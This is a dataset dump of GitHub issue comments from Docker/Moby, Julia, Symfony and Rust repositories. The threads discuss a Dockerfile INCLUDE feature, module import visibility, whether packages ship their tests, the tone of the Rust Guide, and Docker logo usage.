moby/moby/3378/411526501,3378,Just my two cents... I am just learning more about Docker at the moment and I feel something like INCLUDE would be very useful. I liked the multiple inheritance example above and wanted to address the comments about possible problems and conflicts with it. Multiple inheritance is hard in any language that supports it but when a conflict occurs it's the responsibility of the Docker file creator to rethink what they are doing and start again. Docker should just build the image and not try to prove the build has no issues. ,,False
moby/moby/3378/411529506,3378,"@friend I have support for macros in   I could support ""include"" too. ",,False
moby/moby/3378/411810590,3378,"That would be missing the point.  The goal is not to include the Dockerfile definition.  The goal is to include the docker image.  This is going to seem absurd because it is off the top of my head from fedora include ubuntu /ubuntu include debian /debian Reasonably I would expect this to start off with the image of fedora.  Then add the image for ubuntu under the folder /ubuntu.   Then added the image for debian under /debian . This is of course absurd, in that why do I want to mix a bunch of operating systems into one image?   But a more useful example might be from fedora include plex /plex include commericalremover /plex/add-on/commericalremover Now in this case it makes more sense.  In that if these are other images don't have operating specific components I have an easy way to make things modular. On Wed, 8 Aug 2018 at 1548, Arkady Miasnikov notifications@friend.com wrote ",,False
moby/moby/3378/411824851,3378,"That last one is possible already;  accepts both a build-stage, or an image, so for example; Edit; or to take the actual example; ",,False
moby/moby/3378/411891661,3378,"Exactly.   Which is why I would consider the 2017 update that added ""COPY --from"" as having completed the original request.   There is absolutely nothing more I was looking for from this ticket. Ideas that were brought up later like auto-rebasing the include, would be nice features.   But they do go beyond the original ask. Regards, Bill On Thu, 9 Aug 2018 at 1255, Sebastiaan van Stijn notifications@friend.com wrote ",,False
moby/moby/3378/450858586,3378,"@friend Using multi-stage builds for this still requires you to know which files exactly to copy from each image; that's even harder to maintain than copy-pasting the setup code from another image. Of course, merging Docker images is not trivial. Since arbitrary scripts can be run during builds, the build process resists any general attempt of automatic conflict detection; the halting problem says hi!  The best you can do (short of significantly limiting what builds can do) is to define precise semantics say the last / wins (e.g. if they ""write"" the same file) or fail on file-system-level conflict or .... The sometimes stated issue of different ""base"" images (stretch vs ubuntu vs alpine vs ...), however, is simple require that the DAG of image dependencies not only has a single source (the current image) but also a single sink (the shared ""ancestor"" of all images in the ""hierarchy""). Ultimately, of course, you'd get garbage-in-garbage-out -- is it ever different, really? FWIW, my use cases are  Running a Tomcat web application with a PostgreSQL database and an S3 object store.  While this can be solved by using Docker Compose, a single container may be nicer. Multi-language builds run in Docker containers (e.g. on Jenkins, Circle CI, ...).  There are official images for most popular toolchains, but getting a single container equipped to handle more than one runs in exactly the issue discussed here.  ",,False
moby/moby/3378/450910217,3378,"@friend , if you need dynamic generation of Dockerfiles  I suggest adding a domain specific language. There are a couple of examples I am aware of  ",,False
moby/moby/3378/451039097,3378,@friend This is not the only option. The right options is to constrain INCLUDEs to avoid big problems. INCLUDEs can't inherit. There it is. Simple. Still incredibly useful. This feature request is popular but Docker is Free as in Beer but not by any means Free as in Freedom. ,,False
moby/moby/3378/451627679,3378,"@friend With the inclusion of buildkit support since 18.06, users can provide their own frontend parser for the builder. There is already an official (from Docker Inc) experimental Dockerfile parser that includes lots of new features (support for secrets for starters). You can of course also add your own ""INCLUDE"" behavior in a custom Dockerfile frontend, or you can do something totally different that's not Dockerfile at all (there's an example for buidpacks). To use a custom frontend, just need to point Docker at an image which can handle it. Do this as a comment on the first line of your Dockerfile (or whatever thing it will be) More details here  buildkit enabled, Docker can build whatever you want it to (doesn't even have to be a Dockerfile format) with whatever features you need. ",,False
moby/moby/3378/454758482,3378,"As offtopic as that note is, I think it should be noted that you are wrong. Thanks to Docker's Apache licensing, everybody has the freedom to fork and develop their own interpreter for Dockerfiles that provides the features developed here. If they are careful, the resulting images will be compatible with existing Docker runtimes/tools. Of course, the maintainers of the Docker project are similarly free to not merge such a feature into their fork (the original?). ",,False
moby/moby/3378/454816585,3378,@friend That is obviously just meaningless rant without actually referring what is free software. Moby is free software of course. ,,False
moby/moby/3378/454929600,3378,"I did not know it was now Apache licensed. I apologize for the remark and think this is great! Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 2019 at 417 AM Raphael R. notifications@friend.com wrote ",,False
moby/moby/3378/454930706,3378,"I'm sorry, I didn't sleep well and I made a mistake. My comment stands. Free as in Beer means Apache. Free as in Freedom means community control. An Apache project or some other form of governance. Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 2019 at 1232 PM Russell Jurney russell.jurney@friend.com wrote ",,False
moby/moby/3378/454964421,3378,"Disagree. Freeware can be proprietary software. What's community control? Projects run by a foundation? So you would consider VS Code, Atom editor, and Ubuntu as non-free software? Then your definition is significantly different from the one proposed by FSF, EFF, and many other organizations. I agree that Docker Inc is not actively discussing with community in this issue, but this has nothing to do with ""Free as in Freedom"". ",,False
moby/moby/3378/454967151,3378,"Sorry folks, let's not have these sorts of discussions on the issue tracker. We have made it possible to support any build format you want to have via . The ""official"" Dockerfile format does not support this option, but that doesn't mean that  can't make use of it. Check out  as an example of building a custom frontend that works with . Note that this frontend is an example of how you can do something completely different from the Dockerfile format, but that is not necessary. You can take the existing Dockerfile format and add your own functionality if you like. As far as adding something into the official Dockerfile format.... I will say proposals are always welcome, the format is maintained in  in mind, though, every new feature means new burden of maintainership, including often limiting what can be done in the future. I think it's likely that many of the use case for combining multiple Dockerfiles can actually be solved with new functionality in Dockerfile... specicially the ability to  and  from arbitrary images. ",,False
moby/moby/3378/500179198,3378,"If this hypothetical INCLUDE could just create the extra containers as an impl detail with me NOT having to give a @#$% it would greatly reduce the amount of frustration surrounding the implicit and dodgy sales pitch of composable containers. I really just want to get back to the application and delivering functionality. Sorry for the the bad vibes, but I am docker/container noob and ran into the same confusion that a lot of other posters have already expressed. ",,False
moby/moby/22285/150729862,22285,"I've been running a few hundred containers with systemd in them since 1.7. The flags required has changed a little bit. In 1.10 I was adding , , and . With the same flags, it doesn't work in 1.11. With  it works. With  it does not work. Here's a dump of the system Thanks for the help! FYI This is the only thing I could find about the issue while Googling, and it suggests something indeed did change in 1.11 ",,False
moby/moby/16417/107315701,16417,"Currently, only functional test cases are included in the docker community. I plan to create some new performance/stress/stability test cases. For example, performance tests are as follow(included but not limited to)  CPU usage, Disk IO, network IO, TCP/IP bandwidth and latency,concurrent container quantity. Benefits are as follow. (1) They can provide docker users with performance reference. For example, a user need to deploy a server with docker. If the server's memory consumption figure is more than the benchmark data, the user can know much memory is need. (2) We can use them to track performance history data for each commit to find which patch leads to the increase or the decrease of performance data. But I wonder if the community would like to accept them. What is the attitude the docker community? ",,False
julia/JuliaLang/17948/170503491,17948,"Currently, when importing libraries in Julia, one cannot selectively import only the exported symbols of a package without bringing those symbols into the global scope.  This is often not wanted, and indeed the equivalent in C++ () is often recommended against. ",,False
julia/JuliaLang/17948/238985660,17948,use ,,False
julia/JuliaLang/17948/239074759,17948,"@friend That doesn't do what I want.  Consider these two files in the same directory Test1.jl Test2.jl This outputs 2.  I am looking for something that I can use instead of , such that  the first print expression will succeed (because module  will have been brought into scope) the second print expression will fail (because  has not been exported).  That is, I want  qualified access to the module's public API no access to the module's implementation details.  ",,False
julia/JuliaLang/17948/239084741,17948, provides a  macro that does this kind of thing ,,False
julia/JuliaLang/17948/239187785,17948,"There was some recent discussion about how the state of issues around modules and namespacing didn't reflect the general interest in improving them. I've reopened this and added a ""modules"" label for such issues. ",,False
julia/JuliaLang/17948/239494285,17948,"It would be nice to import two or more modules that share one or more exported symbols and designate which module is to be used when all or some of the symbol[s] are used without a module name prefixed (and then when used, not to have warnings about overwriting the so-dominated symbols generated). ",,False
julia/JuliaLang/17948/239516450,17948,"@friend that's a good point, but to me there is a world of difference between qualified and unqualified names. A lot of care absolutely must go into how  by itself is resolved. @friend I don't believe the analogy to  is correct;  does not bring all of its symbols into the global namespace, only the symbol . I can certainly appreciate why people don't want lots of names dumped into their namespace. But by the time you've written , why not just give the value of, well, ? In this case I subscribe to the ""we're all consenting adults here"" attitude. To restrict this, we'd be going to a lot of trouble just to slap you on the wrist and prevent you from accessing something. For example, how would you debug the module, e.g. test  interactively? I'm against complexity that only serves to prevent me from doing things. ",,False
julia/JuliaLang/17948/239541695,17948,"The problem is that ""import"" treats exported and non-exported symbols identically.  If I type , I don't know if  is part of the public interface of  or just an implementation detail. On Aug 12, 2016 158 PM, ""Jeff Bezanson"" notifications@friend.com wrote ",,False
julia/JuliaLang/17948/239550844,17948,"I agree it is good to know which is which.  will tell you just the exported names in a module. Currently tab completion shows all names, but I think it would be good to have a setting to only tab-complete exported names. Documentation also helps; it would be good for  to show a list of exported names, especially if the package lacks documentation. ",,False
julia/JuliaLang/17948/239673991,17948,"I would also like an easy way for this to be enforced at runtime. On Aug 12, 2016 424 PM, ""Jeff Bezanson"" notifications@friend.com wrote ",,False
julia/JuliaLang/17948/239957777,17948,"@friend Yes, I agree.  My perspective was forward -- resolving APIs, however they may become done.  It seems there needs to be an active way to assert dominance (in the form of how unqualified names are resolved when there is more than one qualified form available).  Maybe there is another way to express this API is a refinement of the that one.  Maybe there is a better way -- this one I noticed. ",,False
julia/JuliaLang/17948/240521046,17948,"@friend That would awesome! My preference is that we should hand-hold users more on the documentation side than on the runtime side. I like that Julia separates nonexported functions from exported ones, but doesn't hide them completely. ",,False
julia/JuliaLang/17948/240724364,17948,"It's entirely possible that a post-1.0 version of Julia will add access controls that allow some degree of enforced encapsulation, but preventing people from doing things is not a high priority for 1.0. ",,False
julia/JuliaLang/17948/240848486,17948,"I am not particularly interested in mandatory encapsulation.  I am more interested in making it easier to avoid using private functions, without polluting the global namespace. On Aug 18, 2016 935 AM, ""Stefan Karpinski"" notifications@friend.com wrote ",,False
julia/JuliaLang/17948/240850214,17948,I'm confused by your statement – how is that interest not satisfied currently? ,,False
julia/JuliaLang/17948/240930293,17948,"Currently, there is no way to get access to the public symbols of a module without either injecting them into your scope or making them appear indistinguishable (as far as the consuming code appears) from symbols that are merely implementation details.  So when you write ,  will get  whether it is public or not.  But if you write , then the only difference between exported and non-exported symbols is that , if exported, is injected into your global scope. I don't need for the abstraction barrier to be airtight.  But I do want it to be obvious when I am using something I probably have no business accessing. Perhaps this can be done by convention have a convention that private symbols are in inner modules whose name starts with an underscore, say. On Aug 18, 2016 442 PM, ""Stefan Karpinski"" notifications@friend.com wrote ",,False
julia/JuliaLang/17948/240964173,17948,"While I like the Python convention of prefixing private members of classes and modules with an underscore due to its simplicity it is not very aesthetically pleasing ;-) What is missing is a mechanism that allows one to import a single name but only if it is part of the public interface of the module, e.g. like shown below ",,False
julia/JuliaLang/17948/241033021,17948,"I have thought it felt a little backwards that  is more conservative than , since the latter allows extension. (Compared to just  which is less conservative than  due to bringing in the exports.) More behavioral distinction between the two might make it a little more obvious when to use one vs the other. ",,False
julia/JuliaLang/17948/241034539,17948,is also less conservative than  which does not feel right. ,,False
julia/JuliaLang/17948/241092146,17948,"One option would be a way to declare some symbols as private.  Getting access to them would require reflection (say On Aug 19, 2016 1032 AM, ""Helge Eichhorn"" notifications@friend.com wrote ",,False
julia/JuliaLang/17948/241182368,17948,"I like the idea of restricting  to only import exported symbols.  When it comes to qualified access to members of a module if we ever get  overloading then it could be natural to let  work, but require  with a . ",,False
julia/JuliaLang/17948/243169681,17948,"If access restriction is ever being added, would it be out of scope to add a more complex rights management in order to disable the IO part (and maybe others independently) of julia? (in order to make it a fully virtual runtime w/o any reality interaction and thus having a ""save"" environment) Concrete reason would be that i'd really love to be able to ""outsource"" parts of a program that i've written so that a user can manipulate it (crazy example i've written a multiplayer game and want to provide access to some underlying methods in order to change behaviour of some things in a pretty complex way, like manipulating the weather based on ingame events) But i obviously neither want any user to be able to shutdown nor misuse the server (for like running a DOS or sending viruses) I know there a a lot of other ways (depending on the situation/use case) to realize such a game, like writing a DSL, doing a whole AST check for ""invalid"" calls (that would be my solution if i had to solve it right now, similar to Reflection/SecurityManagers in Java) or doing the ""calculations"" clientside and only communicate by keywords (thus simply restricting what is considered senseful on the server) But i'm always happy to be lead to even more creative/prettier/faster or otherwise better solutions. That's just my 2 cents for the restriction idea. As i said, it's not about time but about scope (are there chances that julia will ever support such a use case) ",,False
julia/JuliaLang/17948/243174120,17948,"A more thorough capability or access control system is definitely a bigger problem. A library for launching missiles will export its  function since that's the entry point, but that doesn't mean everybody is allowed to launch missiles. This issue is really only about convenience, making it easier to avoid depending on private functions. For those purposes it's ok if there are workarounds like , but for real security the goal is to make it as close to impossible to launch the missiles as you can. ",,False
julia/JuliaLang/17948/245263005,17948,"Agreed. For security, you really want a microservices approach with an audited / verified kernel. ",,False
julia/JuliaLang/17948/245266773,17948,"o/t, but cloudabi has some really neat ideas with capability based security there ",,False
julia/JuliaLang/17948/245373756,17948,"cloudabi is Windows averse It is nice of them to allow others to use their relatively more secure versions of the cloudabi, 'nix zeitgiest apps and these other commonly used packages autoconf, automake, bash, bison, boost, buddy, bzip2, c-runtime, cairo, cairomm, cloudabi-reexec, cloudabi, cloudlibc, cmake, compiler-rt, coreutils, curl, cxx-runtime, diffutils, expat, findutils, flac, flex, freetype, fribidi, gawk, gettext, giflib, glib, gmpUpgr, grep, help2man, icu4c, jasper, jpeg, json-c, lcms2, libarchive, libatomic-ops, libcroco, libcxx, libcxxabi, libebml, libevent, libexif, libffi, libgcrypt, libgpg-error, libid3tag, libksba, libmad, libmatroska, libmngRena, libogg, libpng, libressl, libsamplerate, libsigcxx, libsndfile, libsodium, libtasn1, libtheora, libtomcrypt, libtomfloat, libtommath, libtompoly, libtool, libunwind, libvorbis, libwebp, libxml2, libxslt, libxspf, llvm, lua, lz4, lzo, m4, make, memcached, mpfr, nettle, ninja, nspr, openjpeg, opus, pcre, pcre2, picosat, pixman, pkgconf, python, qpdf, re2, sed, snappy, speex, speexdsp, taglib, texinfo, tiff, tomsfastmath, uriparser, x265, xz, yaml, zlib ",,False
julia/JuliaLang/17948/260837624,17948,"In Common Lisp,  can only access exported symbols, while  is for all symbols. It worked well. Too bad  already has a meaning. ",,False
julia/JuliaLang/17948/260948148,17948,could be reclaimed. There's also  which is already deprecated in 0.6 and will be fully available in 1.0. ,,False
julia/JuliaLang/17948/270893732,17948,"As far as I can tell, this is a dup of ",,False
julia/JuliaLang/17948/378967344,17948,"Yes, looks very much like a dup. ",,False
symfony/symfony/17749/132715529,17749,"The Source  Often when I'm auto-completing classes in my IDE, I get the suggestion to use the *Test file. Project wide searches and Usage Finder always shows tests using the search key or method/class etc. KernelTestCase and WebTestCase are library dependencies in a test directory  I'm working on adding some functional tests to a bundle and this gave me a problem. I had to depend on the FrameworkBundle 2.3 for BC reasons but I couldn't depend on 2.3 because that one didn't have the KernelTestCase yet so I needed 2.5. The Symptoms For applications the recommended location is in /tests/. For Application bundles this seem to be /Tests/ and the same goes for re-usable bundles. The current setup with the recommendations and implementations cause a few issues  I need to load files from the vendor Tests in order to run my tests. I get vendor test files which I can autoload and depend on. 2 different recommendations for test locations. I cannot easily exclude them from the distributed version.  The Solution Personally I always put my code in bundles in the /src/ directory, this gives me a clean root directory and my tests in /test/. This leaves the root directory for all the meta-information for your package (example). So my suggestion is  Extract the  and  to another component (PhpunitBridge?) where they can reside in the source instead of test location. Exclude the tests from the archive. Not put the source in the package root but in /src/ like suggested for applications. Put tests in /test/ or /tests/ where they have an autoload-dev so they cannot be loaded in production code.  This will create a clearer structure where your source is not polluted by the tests and you cannot put anything of your public api in your tests (like the TestCases). When the test-cases are moved out, I can also require 2.3 or higher instead of 2.5 and higher (thus 2.7). ",,False
symfony/symfony/17749/182536635,17749,"This topic has been discussed some time ago, the major problem with this idea is the subtree split of each component. ",,False
symfony/symfony/17749/182541384,17749,@friend Yeah I got informed about that. I've updated the issue. ,,False
symfony/symfony/17749/182552387,17749,"We used to have tests outside of the src directory (see  usually put test cases outside of the tests namespace already, so they're not part of the  namespace. Both WebTestCase and KernelTestCase are already in the  namespace (the first one was moved recently). ",,False
symfony/symfony/17749/182799760,17749,"To me there is a difference between tests  (internal, should not be extended in other packages) and test helpers  (traits/test-cases). When you ""need"" (there is no other way) to extend a test helper that is in  it should be moved to  so you can use it. I actually have that problem with some Doctrine tests,   I solved using  there is a risk of breakage here as I'm using classes that are not part of the public API and therefor have no BC policy. Mark tests directories as excluded plus one going to that now as I to have fallen trap to this... ",,False
symfony/symfony/17749/182806356,17749,"@friend, that's 68 (symfony 49) directories in total which I'd rather not even have on my filesystem to begin with. I only need them when I explicitly install that repository and I have to run them. Given I'd exclude Tests via a regex, the kernel/web tests are excluded too. The solution is valid but won't work if you have 20 applications and dozens of bundles which all use symfony. ",,False
symfony/symfony/17749/183706833,17749,This was also done with gitattributes and reverted in #6605 I still think this should be reintroduced as I said in ,,False
symfony/symfony/17749/189947863,17749," Tests are documentation and should remain next to their src. For production releases, I assume everyone has their own prefered deploy mechanisms removing files not needed for such an env can easily be accomplished during your preferred deploy operation. I too use PHPStorm I don't understand the difficulty of setting the tests directory to ignored within the IDE if such is desired.  ",,False
symfony/symfony/17749/190122254,17749,"@friend Because if you use symfony/symfony and have 20+ applications doing this, you'll spend too much time ignoring them, where as excluding tests from the packaged version is something you do with your own package, not that of others. ",,False
symfony/symfony/17749/191877781,17749,An other option ,,False
symfony/symfony/17749/191883284,17749,"I also just sent this message to github support Is there a way to get a ZIP that includes ALL files (i.e. that is built without taking .gitattributes into account?) That would be really great because that would allow us to have packages for our project one for humans (with the full source) and one for robots/ci-scripts (the current one). If anyone has the answer (or could push for making this happen), help welcomed ) ",,False
symfony/symfony/17749/191898500,17749,An other option would be to add a feature to composer to clean paths specified in the  option in composer.json files. ,,False
symfony/symfony/17749/192028947,17749,One more reasons to exclude tests Composer beta ,,False
symfony/symfony/17749/192172162,17749,"Here is my reasoning pro keeping tests where they are and also in the .zip archives  Some of us want the tests out, either because e.g ""they pollute their autocompleter, or their code searches or just their filesystem"". Some of us want the tests in, because e.g. ""having them always at hand enables this coding workflow of looking at tests to know how the code behaves and how it should be used"". You can grow the list of pro and contra arguments, the truth is that everyone is right this is a matter of personal preference. In this situation, we, as the Symfony project, can have two attitudes we can forcibly decide for others, or we can empower people in allowing both way of things. Given the history of this very topic, and the presented arguments at both sides, I'm now convinced that we should not enforce what would be otherwise a subjective and controversial ""best way"". So the question for me is now which choice allows both practices to coexist? The first aspect is the if we always ship the tests as we do today, 2. is allowed, and 1. is just one IDE configuration or cleaning script away. Moving tests out of each components folder breaks 2. for subtree splits. Looks like a no-go. Now moving tests out of archives since we install code through composer, we could use --prefer-dist for 1. and --prefer-source for 2. But this ignores one practical and fundamental difference --prefer-source is slow as hell. --prefer-dist has one ZIP to download, and then has local caching, which means it's fast, very fast. --prefer-source has to  and isn't cached as of now. Nobody can't possibly accept to loose so many time because ""hey, 2. is your choice, haha"". So, my point is that in practice, this has the same effect as not shipping the tests at all. No-go again.  In conclusion I'm all for the status quo, which is the best solution, unless --prefer-source can be made as fast as --prefer-dist (or any other way that would make fetching the tests as fast, see e.g. my email to github support). Meanwhile, I'm all for enhancing editorconfig or any other way to help 1. supporters configure their IDE or clean their filesystem. ",,False
symfony/symfony/17749/192176071,17749,"How many people actually spend time diving into tests and trying to understand them (which is usually more complicated than looking at the code)? If people really want to see the tests while they are developing they can choose already . If this is too slow for them, they can also view the files on github. By packaging the tests, people who don't use them or don't need them (My guess is 90%+) still get them. This is extra bandwidth, extra actions during deployment and extra effort in the IDE. If people really, really want to run the tests, they should make a clone (or grab the zip from github) and run it in there with their  dependencies. When the package comes from Packagist it should not include test files for the simple reason that most people won't even need them and should follow one of the above steps for a better workflow in the first place. In my eyes this would mean  Leaving the repository as is for github Adding composer excludes for packaging  ",,False
symfony/symfony/17749/203854643,17749,"@friend no, it's not a matter of personal preference. There are situations where you can do everything, but it's better to do only one thing (like putting your sources outside the  folder). There are two environments with different needs, dev &amp; prod, but we have to face the problems in the order of priority, so let's discuss prod before dev. In production we have two topics security and performance. NOT having additional files will always improve both. Security the only code that can't be broken, or can't broke something else, is the one that there isn't. Performance less code, less resources, less timings. The  already present it's good, but not enough. I am sad that you closed your  about  I highly hope that to be merged. Once the production is faced, only then we can discuss about development, and whether or not including additional informations (like tests) in a dev setup. ",,False
symfony/symfony/17749/207341923,17749,@friend any consideration about my previous thought and reopening ,,False
symfony/symfony/17749/207345336,17749,No way for me I won't take the lead on this topic... ,,False
symfony/symfony/17749/220913973,17749,What about this solution for the problem? ,,False
symfony/symfony/17749/280589079,17749,"Just out of interest, why does symfony recommend that the tests are in the root of a project but do not do this in symfony/symfony? I understand that there would be issues with the subtree split, but i’m sure something could be worked out? I’m not trying to force a change here but just understand the reasoning so I can work out my own best practice. Having the tests together in root seems like a logical and friendly solution. However symfony moved them out, does this mean the more complex projects get I would probably need to move them out too? ",,False
symfony/symfony/17749/280602702,17749,"@friend because we want to include tests in our subtree split repositories, and for that, they need to be in the split folder. ",,False
symfony/symfony/17749/280605110,17749,"@friend yes, as I say, I understand about that. However, as far as i recall this is some automated process (i think with split.sh) so there is probably a way around this to make it work. It just seems very strange to say ""We recommend you do it like this, but we do it differently"". If symfony/symfony immediately hit an unsolveable problem with this structure, perhaps there is something inherently wrong? ",,False
symfony/symfony/17749/280609083,17749,"@friend if you read official Symfony best practices, you may notice that there are different for non-reusable apps (ie your private project) than for shared packages/bundles. The recos that applies to apps are made to prevent doing things that bundle require, but are just overengineering to private apps. The same apply here. symfony/symfony is structured to reach its goals, which is not the goal of your private apps. ",,False
symfony/symfony/17749/280610589,17749,"@friend can we close this one? From the symfony project pov, this is solved to me, it's an argumented ""no"". I understand you don't agree, but that's still ""resolved"". ",,False
symfony/symfony/17749/280612098,17749,"@friend thanks, yes I understand that. Lots of private apps sometimes end up public / reusable tho. If this structure locks you in, or may create problems down the line, then it might not be advisable as a general standard. If there is a workaround to deal with it, mayne it would be good to standardise symfony/symfony too? Please dont think i am trolling you or trying to cause an problem here 😄. That is really not my intention and I am very grateful for all the hard work and though you guys put in 👍. I am just attempting to gain understanding and maybe offer perspective. Perhaps the solution is a mutually agreeable one? Perhaps there is a solution but ""it just isn't worth it"". Resistance to change without consideration can lead to unfortunate situations in the future. Perhaps this issue is just not high prio or maybe the discussion should be taken elsewhere? ",,False
symfony/symfony/17749/280616335,17749,"symfony/symfony is a meta project the project levels are the subtree splits. At the project level, tests are at the root. That's what @friend mentioned also. ",,False
symfony/symfony/17749/280616993,17749,I think this issue of symfony/symfony root vs package root will become a lot less once flex is released. ,,False
symfony/symfony/17749/280623032,17749,"@friend that makes it clearer to see it as a ""meta"" project. A bit strange that work is done on the meta project but i guess that is thats a side affect of the monolithic project approach. Definitely makes sense in this case tho, so thank you. @friend could you point me in the right direction for info on flex? ",,False
symfony/symfony/17749/280624369,17749,"@friend there's no public info on ""Symfony Flex"" project yet. It will be released ""soon"" and it will be a new way to install/manage Symfony applications in a ""composable"" way. ",,False
symfony/symfony/17749/280624457,17749,"@friend This was only announced during the SymfonyCon keynote for now, and the video is not yet available AFAIK. ",,False
symfony/symfony/17749/280640396,17749,"Great, I will keep a look out for it. Thanks for the info everyone 👍 ",,False
rust/rust-lang/15539/37423990,15539,"I've been reading the new Rust Guide. So far the chatty, informal, reassuring tone has left me waffling between being annoyed and being reassured, but mostly reassured. However, when I got to Programmers love car analogies, so I've got a good one for you to think about the  relationship between cargo and rustc rustc is like a car, and cargo is like a robotic  driver. You can drive your car yourself, of course, but isn't it just easier to let a  computer drive it for you?  The balance was tipped, and I became annoyed at the tone and started yearning for the old no-nonsense tutorial back. So I suggest removing that paragraph, since it adds little. ",,False
rust/rust-lang/15539/48416066,15539,"I specifically noted this, and nobody had any real objections at the time. ",,False
rust/rust-lang/15539/48416951,15539,"For what it is worth, I had the same “Ugh — too much cute!” reaction to A place for everything, and everything in its place.  ",,False
rust/rust-lang/15539/48416997,15539,"I'm not saying it shouldn't be, I just want to acknowlege that I wrote it, said ""lol"", and then shipped it with the intention of asking if it's too cute or not. ",,False
rust/rust-lang/15539/48417193,15539,"For what it is worth, I suspect the chatty and reassuring tone is great for a lot of readers, and I'm excited about the idea of making Rust accessible to the less experienced programmers (or at least, less experienced in the ways of low-level/systemsy/unixy tools), and I imagine this guide will work well for them. So, despite my grumpy comment about wanting the old tutorial back, I like this one and I'm glad you're working on it. And I know that every reader has different bands of pleasure and tolerance for fluff. I'm noting the bits where I find myself becoming conscious of my own displeasure just in case it helps you tune it. I'm not commenting on all the bits where I found the fluff to be pleasurable. ",,False
rust/rust-lang/15539/48417468,15539,"Absolutely. I think that being a bit lighter makes the docs way better than boring, dry ones, but I also recognize that it's easy to go overboard. ",,False
rust/rust-lang/15539/48433203,15539,"Well, at least my crack about how cargo makes the car go didn’t get in! (That would certainly have been too much!) ",,False
rust/rust-lang/15539/48446182,15539,"I do like the fluffy tone for the most part, but this part threw me off too. Mostly because I don't get the analogy. How is cargo like a robotic driver? I don't get it. Analogies are risky in that while they can serve to enlighten, they can also confuse if the reader doesn't ""get it"". I think this one could be particularly tricky to understand for people whose English is not that strong. Also ""programmers love car analogies"" is a bit of a generalization ;) ",,False
rust/rust-lang/15539/48447512,15539,"I think that the new Guide is way better than the old Tutorial was.  See, it's a guide, not a reference, (we have the Manual for that).  The Guide is meant to teach the reader about Rust and systems programming in an engaging manner, like a good book would. There's certainly a place for a more formal format as well, but that is what the manual is for. Maybe it is because I haven't had much previous experience with systems programming, however the Guide is very accessible and this makes it easier for people like me to jump on the Rust train.  I have some limited C++ experience, which is certainly helping, but the attitude that one has to know the old in order to learn the new is I think preventing many new programmers from trying some of these newer languages. For a lot of people, it comes down to cost/benefit analysis If I have to know C++ well in order to get into Rust, I'm just not going to invest the time into Rust but instead into C++, because of the much more established ecosystem. If instead I can jump onto Rust from e.g. Ruby/Python/JavaScript background as well, can learn at my own pace and don't have to first invest into C++ then I'm sold. A lot of people adopted the dynamic languages precisely because they could be picked up from scratch and to be honest the dynamic people are one of the most active open-source communities here on GitHub, (Just check the amount of JavaScript pouting in every day) and if we manage to capture their interest the Rust ecosystem will greatly benefit. Just look at Go, released less than 5 years ago and where it is today, thanks to the people coming over from Python/Ruby. I am not saying the Guide should be accessible to everybody, however it should be accessible to people without previous C++ experience and I think @friend  does a great job at achieving this goal. As far as the car analogy, well sure - not every analogy's so great, but that goes for a lot of books, TV shows etc. as well and I think as long as a point is made clearly, the particular analogy doesn't really matter that much. ",,False
rust/rust-lang/15539/48455368,15539,"I find analogies are ultimately distracting and unhelpful. Rather than saying what cargo is like, it's better to say what it actually is. It's probably better to first explain what cargo is, before explaining that it's in alpha state. ",,False
rust/rust-lang/15539/48456375,15539,"Analogies are good only when they explain a difficult relation in terms of ordinary experiences. In this particular case the relation rustc-cargo isn't very difficult to grasp and the robotic drivers image isn't ordinary or helpful - rather, it's a convolution. ",,False
rust/rust-lang/15539/48470173,15539,"I think part of the problem is that which every tutorial has its adressing very different people at the same time. Perhaps there should be two tutorials Rust for ""beginners"" (anyone not too familiar with compiled languages), and Rust for those with more ""experience"". I think the chatty, friendly language is great for beginners, but could easily be ""distracting and unhelpful"" for those already familiar with the basic concepts, if not with how Rust handles them. Just an idea... ",,False
rust/rust-lang/15539/48476299,15539,"@friend Yeah, I think that's a great idea and we already kind of have that with the Guide being chatty and the Tutorial being not so chatty.  So, perhaps instead of the Guide replacing the Tutorial, it could supplement the Tutorial, although that would require two pieces of documentation with a similar aim being maintained. ",,False
rust/rust-lang/15539/48479349,15539,"@friend Yes, it has its drawbacks it would require two pieces of documentation with similar aims; I'm not sure how that is best addressed. I wonder what our Documentation Master @friend thinks... It is a tricky thing, though beginners need to be taught with an understanding that these concepts are complicated, take time to learn, and are not simple; I think the current tutorial does that very well. More experienced people see things like type systems and pointers as obvious and simple and feel talked-down-to when those concepts are given too much time and treated too simply for their tastes. Perhaps its more like a 2-part tutorial, where the ""beginner"" section leads into the ""experienced"" section, and at the beginning, there is a suggestion that those with more experience may want to jump to Part 2? That still has its drawbacks, as you have to balance between covering everything in the right place for each group and trying not to repeat yourself, but maybe... ",,False
rust/rust-lang/15539/48482740,15539,"@friend Perhaps it doesn't have to be 2 part, but having a piece of JavaScript where one could click on a ""Background"" tab next to problematic sections (e.g. pointers) and have a little bit of a background info on pointers unfold, whereas the experienced programmers would just leave the ""Background"" tabs collapsed and flow with it as an advanced tutorial.  This way you can have one Tutorial accessible to both camps, altrough I would too like to hear @friend's opinion on this. ",,False
rust/rust-lang/15539/48490523,15539,"Here is my opinion and general plan  I think that enough people not liking this is justification to remove it. Can anyone suggest something that should go in its place, or should we just axe the paragraph and be done with it? ",,False
rust/rust-lang/15539/48493035,15539,"@friend Based on the comments and the fact that the next paragraph explains what Cargo really is in the first sentence; ""Cargo manages three things building your code, downloading the dependencies your code needs, and building the dependencies your code needs."", I would just axe the analogy paragraph and be done with it. Awesome Guide BTW. ",,False
moby/moby/18264/119067027,18264,"Hello, I'd like to know if is it allowed in a commercial product to use a monochrome version (for example  to refer to Docker. I'm asking this because I need to use this icon in a narrow space (about 20x20px) and the original icon when scaled down looks blurred, and, in your documentation, you ask developers to use the original icon with even the ""Docker"" text below it. Thanks. ",,False
moby/moby/18264/315195948,18264,"Just as a heads up, it appears that  has been updated. There's an excellent simplified logo that looks great. ",,False
moby/moby/18264/315198074,18264,"Ah, yes; I do see that there's a requirement to keep the  name in the logo, so looks like it's still not allowed (well, without written permission I guess) to use just the Whale icon &lt;img width=""471"" alt=""screen shot 2017-07-13 at 13 48 26"" src=""",,False
moby/moby/18264/315203930,18264,Too bad one can't even change the plain logo's color to white or black so it matches the hundreds of other logos legally provided for icon/footer use. ,,False
moby/moby/18264/315269184,18264,"@friend sorry for that, I understand it's frustrating; also not something I can influence. There's a section that mentions exceptions - could be worth reaching out; &lt;img width=""920"" alt=""screen shot 2017-07-13 at 21 48 29"" src=""",,False
